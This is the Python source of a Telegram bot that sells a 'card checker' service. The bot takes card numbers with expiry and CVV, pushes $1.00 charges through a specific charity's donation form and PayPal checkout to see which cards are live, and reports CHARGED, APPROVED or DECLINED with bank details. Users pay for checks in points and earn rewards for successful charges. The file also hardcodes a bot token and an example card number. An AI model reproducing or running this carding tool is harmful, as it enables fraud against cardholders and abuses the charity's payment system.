import telebot
import time
import threading
from telebot import types
import requests
import os
import re
import base64
from datetime import datetime
from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent
import urllib3
import io
import json
import socket
import http.client

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TOKEN = "8740209519:AAFPfns0Byh0vlkWwNxuNWAD8xBcXxsGjOI"
bot = telebot.TeleBot(TOKEN, parse_mode="HTML")

ADMIN_IDS = [1013384909]
stopuser = {}
user_checking_threads = {}

now = datetime.now()
current_year = now.year
current_month = now.month

POINTS_FILE = "points.json"

class PointsManager:
    def __init__(self):
        self.points = {}
        self.free_point_given = {}
        self.load_data()
        
    def load_data(self):
        if os.path.exists(POINTS_FILE):
            try:
                with open(POINTS_FILE, 'r') as f:
                    data = json.load(f)
                    self.points = data.get('points', {})
                    self.free_point_given = data.get('free_point_given', {})
            except:
                self.points = {}
                self.free_point_given = {}
    
    def save_data(self):
        try:
            data = {'points': self.points, 'free_point_given': self.free_point_given}
            with open(POINTS_FILE, 'w') as f:
                json.dump(data, f, indent=4)
            return True
        except:
            return False
    
    def get_free_point(self, user_id):
        user_id = str(user_id)
        if user_id not in self.free_point_given:
            self.points[user_id] = float(self.points.get(user_id, 0)) + 1
            self.free_point_given[user_id] = True
            self.save_data()
            return True
        return False
    
    def add_points(self, user_id, amount):
        user_id = str(user_id)
        self.points[user_id] = float(self.points.get(user_id, 0)) + float(amount)
        self.save_data()
        return self.points[user_id]
    
    def deduct_points(self, user_id, amount):
        user_id = str(user_id)
        if int(user_id) in ADMIN_IDS:
            return True
        if float(self.points.get(user_id, 0)) >= float(amount):
            self.points[user_id] = float(self.points.get(user_id, 0)) - float(amount)
            self.save_data()
            return True
        return False
    
    def get_points(self, user_id):
        user_id = str(user_id)
        if int(user_id) in ADMIN_IDS:
            return 999.0
        return float(self.points.get(user_id, 0))
    
    def check_points(self, user_id, required=0.5):
        user_id = str(user_id)
        if int(user_id) in ADMIN_IDS:
            return True
        return float(self.points.get(user_id, 0)) >= required
    
    def reward_charge(self, user_id):
        user_id = str(user_id)
        if int(user_id) in ADMIN_IDS:
            return
        self.points[user_id] = float(self.points.get(user_id, 0)) + 2
        self.save_data()
        try:
            bot.send_message(user_id, f"Congratulations! You received 2 points for CHARGE!\nBalance: {self.points[user_id]} points")
        except:
            pass

points_manager = PointsManager()

def check_gateway(ccx):
    s = requests.Session()
    ccx = ccx.strip()
    parts = ccx.split("|")
    pan = parts[0]
    month = parts[1]
    year = parts[2][-2:]
    cvv = parts[3]
    
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36'}
    r = s.get('https://cjrimpact.org/donations/425-3-2/', headers=headers)
    
    if r.status_code != 200:
        return "ERROR: Site unreachable"
    
    try:
        form_id = re.search(r'name="give-form-id" value="(.*?)"', r.text).group(1)
        form_prefix = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text).group(1)
        form_hash = re.search(r'name="give-form-hash" value="(.*?)"', r.text).group(1)
        token_enc = re.search(r'"data-client-token":"(.*?)"', r.text).group(1)
        token_dec = base64.b64decode(token_enc).decode()
        access_token = re.search(r'"accessToken":"(.*?)"', token_dec).group(1)
    except:
        return "ERROR: Failed to parse page"
    
    m = MultipartEncoder({
        'give-form-id-prefix': (None, form_prefix),
        'give-form-id': (None, form_id),
        'give-form-hash': (None, form_hash),
        'give-amount': (None, '1.00'),
        'payment-mode': (None, 'paypal-commerce'),
        'give_first': (None, 'Test'),
        'give_last': (None, 'User'),
        'give_email': (None, 'test@email.com'),
        'give-gateway': (None, 'paypal-commerce'),
    })
    
    headers = {'Content-Type': m.content_type, 'User-Agent': 'Mozilla/5.0'}
    r = s.post('https://cjrimpact.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_create_order', 
               headers=headers, data=m)
    
    try:
        order_id = r.json()['data']['id']
    except:
        return "ERROR: Order creation failed"
    
    headers = {
        'Authorization': f'Bearer {access_token}',
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0'
    }
    
    payload = {
        'payment_source': {
            'card': {
                'number': pan,
                'expiry': f'20{year}-{month}',
                'security_code': cvv
            }
        }
    }
    
    s.post(f'https://cors.api.paypal.com/v2/checkout/orders/{order_id}/confirm-payment-source',
           headers=headers, json=payload)
    
    m2 = MultipartEncoder({
        'give-form-id-prefix': (None, form_prefix),
        'give-form-id': (None, form_id),
        'give-form-hash': (None, form_hash),
        'give-amount': (None, '1.00'),
        'payment-mode': (None, 'paypal-commerce'),
        'give-gateway': (None, 'paypal-commerce'),
    })
    
    headers = {'Content-Type': m2.content_type, 'User-Agent': 'Mozilla/5.0'}
    r = s.post(f'https://cjrimpact.org/wp-admin/admin-ajax.php?action=give_paypal_commerce_approve_order&order={order_id}',
               headers=headers, data=m2)
    
    response_text = r.text.lower()
    
    if 'true' in response_text or 'success":true' in response_text:
        return "ORDER_PLACED - CHARGE!"
    elif 'insufficient_funds' in response_text:
        return "INSUFFICIENT_FUNDS - APPROVED"
    elif 'cvv' in response_text:
        return "CVV_FAILURE - DECLINED"
    else:
        return "DECLINED"

def luhn_check(number):
    total = 0
    reverse_digits = number[::-1]
    for i, d in enumerate(reverse_digits):
        n = int(d)
        if i % 2 == 1:
            n *= 2
            if n > 9:
                n -= 9
        total += n
    return total % 10 == 0

def reg(cc):
    parts = [p for p in re.split(r'\D+', cc) if p != '']
    if len(parts) >= 4:
        pan = parts[0]
        mm = parts[1].zfill(2)
        yy = parts[2]
        cvc = parts[3]
        if len(yy) == 4 and (yy.startswith('20') or yy.startswith('19')):
            pass
        elif len(yy) == 1:
            return None
        is_amex = pan.startswith('34') or pan.startswith('37')
        expected_pan_len = 15 if is_amex else 16
        expected_cvc_len = 4 if is_amex else 3

        if not re.fullmatch(r'\d{%d}' % expected_pan_len, pan):
            return None
        if not re.fullmatch(r'\d{2}', mm) or not (1 <= int(mm) <= 12):
            return None
        if not (re.fullmatch(r'\d{2}', yy) or re.fullmatch(r'\d{4}', yy)):
            return None
        if not re.fullmatch(r'\d{%d}' % expected_cvc_len, cvc):
            return None
        if not luhn_check(pan):
            return None

        return f"{pan}|{mm}|{yy}|{cvc}"
    return None

def get_bin_info(cc):
    try:
        response = requests.get(f"https://lookup.binlist.net/{cc[:6]}", 
                                headers={'Accept-Version': '3'},
                                timeout=8)
        if response.status_code == 200:
            data = response.json()
            brand = data.get('scheme', 'UNKNOWN').upper()
            card_type = data.get('type', 'UNKNOWN').upper()
            level = data.get('brand', 'UNKNOWN').upper()
            bank = data.get('bank', {}).get('name', 'UNKNOWN')
            country_name = data.get('country', {}).get('name', 'UNKNOWN')
            country_code = data.get('country', {}).get('alpha2', '')
            
            flag_map = {'US': '🇺🇸', 'GB': '🇬🇧', 'CA': '🇨🇦', 'TR': '🇹🇷', 'AE': '🇦🇪'}
            flag = flag_map.get(country_code, '🏳️')
            
            return f"{brand} · {card_type} · {level}", f"{bank}", f"{country_name} {flag}"
    except:
        pass
    
    return "UNKNOWN · UNKNOWN · UNKNOWN", "UNKNOWN", "UNKNOWN"

@bot.message_handler(commands=["start"])
def handle_start(message):
    user_id = str(message.from_user.id)
    points_manager.get_free_point(user_id)
    
    name = message.from_user.first_name
    points = points_manager.get_points(user_id)
    points_text = "Unlimited" if points == 999 else f"{points} points"
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn_check = types.InlineKeyboardButton("Check Cards", callback_data="show_check_menu")
    btn_split = types.InlineKeyboardButton("Split Files", callback_data="show_split")
    btn_clean = types.InlineKeyboardButton("Clean Cards", callback_data="show_clean")
    btn_points = types.InlineKeyboardButton("My Balance", callback_data="show_points")
    btn_buy = types.InlineKeyboardButton("Buy Points", callback_data="show_buy")
    btn_help = types.InlineKeyboardButton("Help", callback_data="show_help")
    
    markup.add(btn_check)
    markup.add(btn_split, btn_clean)
    markup.add(btn_points, btn_buy)
    markup.add(btn_help)
    
    bot.send_message(
        message.chat.id,
        f"Welcome {name}\n\nYour balance: {points_text}\nCheck cost: 0.5 points\nCHARGE reward: +2 points\n\nChoose your service:",
        reply_markup=markup,
        parse_mode="HTML"
    )

@bot.message_handler(func=lambda message: message.text.lower().startswith('/pp'))
def manual_check(message):
    user_id = str(message.from_user.id)
    
    if not points_manager.check_points(user_id, 0.5):
        markup = types.InlineKeyboardMarkup()
        btn_contact = types.InlineKeyboardButton("Buy Points", url="https://t.me/o8380")
        markup.add(btn_contact)
        bot.reply_to(
            message,
            f"Insufficient balance!\n\nYour balance: {points_manager.get_points(user_id)} points\nCheck cost: 0.5 points\n\nContact support: @o8380",
            reply_markup=markup,
            parse_mode="HTML"
        )
        return
    
    try:
        cc = message.text.split(' ', 1)[1]
    except:
        if message.reply_to_message:
            cc = message.reply_to_message.text
        else:
            bot.reply_to(message, "Usage: /pp card|month|year|cvv")
            return
    
    cc = reg(cc)
    if not cc:
        bot.reply_to(message, "Invalid format!\nExample: /pp 5165780107772615|06|2029|469")
        return
    
    points_manager.deduct_points(user_id, 0.5)
    
    msg = bot.reply_to(message, "Checking card...")
    start_time = time.time()
    
    try:
        result = check_gateway(cc)
    except Exception as e:
        result = str(e)
    
    end_time = time.time()
    
    if 'CHARGE' in result and int(user_id) not in ADMIN_IDS:
        points_manager.reward_charge(user_id)
    
    brand_text, bank_text, country_text = get_bin_info(cc)
    cc_clean = cc.replace("|", " | ")
    
    if 'CHARGE' in result:
        final_msg = f"CHARGED\ncc - {cc_clean}\n\nGate - Paypal Custom 1$\nResp - ORDER_PLACED\nPrice - $1.00\nUser - @o8380\n\nBIN\n{brand_text}\n{bank_text}\n{country_text}"
    elif 'APPROVED' in result:
        final_msg = f"APPROVED (Insufficient Funds)\n\nCard: {cc_clean}\nGateway: Paypal Custom 1$\nResult: {result}\n\nDev: Mustafa | @o8380"
    else:
        final_msg = f"DECLINED\n\nCard: {cc_clean}\nGateway: Paypal Custom 1$\nResult: {result}\n\nDev: Mustafa | @o8380"
    
    bot.edit_message_text(final_msg, chat_id=message.chat.id, message_id=msg.message_id, parse_mode="HTML")

# باقي الكود للواجهات والأزرار (show_check_menu, show_split, etc.)
# ... 

def run_bot():
    while True:
        try:
            print("="*50)
            print("Paypal Custom 1$ Bot Running")
            print("Gateway: CJRI Impact (1.00$)")
            print("Developer: Mustafa | @o8380")
            print("="*50)
            bot.infinity_polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(10)
            continue

if __name__ == '__main__':
    run_bot()
